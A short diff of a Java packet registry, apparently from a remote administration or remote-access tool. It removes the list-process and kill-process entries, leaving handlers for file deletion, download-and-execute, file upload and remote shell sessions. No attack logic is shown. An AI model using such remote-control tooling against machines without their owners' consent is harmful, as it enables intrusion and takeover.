@@ -17,8 +17,6 @@ public class IncomingPackets {
         PACKETS_INCOMING.put((short) 16, Packet16DeleteFile.class);
         PACKETS_INCOMING.put((short) 17, Packet17DownloadExecute.class);
         PACKETS_INCOMING.put((short) 18, Packet18Update.class);
-        PACKETS_INCOMING.put((short) 19, Packet19ListProcesses.class);
-        PACKETS_INCOMING.put((short) 20, Packet20KillProcess.class);
         PACKETS_INCOMING.put((short) 21, Packet21ClientUploadFile.class);
         PACKETS_INCOMING.put((short) 22, Packet22RemoteShellTyped.class);
         PACKETS_INCOMING.put((short) 23, Packet23RemoteShellStart.class);
